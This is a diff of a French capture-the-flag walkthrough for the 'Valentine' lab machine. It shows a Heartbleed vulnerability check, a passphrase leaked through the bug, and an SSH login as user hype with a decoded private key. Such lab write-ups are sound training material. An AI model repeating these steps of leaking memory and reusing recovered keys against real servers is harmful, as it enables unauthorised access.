@@ -590,7 +590,7 @@ $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..y.....*....!.!.I.#.............+....
 
 La sortie confirme clairement que le serveur est vulnérable à **Heartbleed (CVE-2014-0160)** :
 
-```
+```bash
 WARNING: valentine.htb:443 returned more data than it should - server is vulnerable!
 ```
 
@@ -715,8 +715,20 @@ heartbleedbelievethehype
 La connexion aboutit avec succès et tu obtiens un shell interactif en tant que l’utilisateur **hype** :
 
 ```bash
+ssh -i /home/kali/tmp/hype_key_decoded hype@valentine.htb
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase for key '/home/kali/tmp/hype_key_decoded': 
 Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
-hype@Valentine:~$
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+hype@Valentine:~$ 
+
 ```
 
 ### user.txt
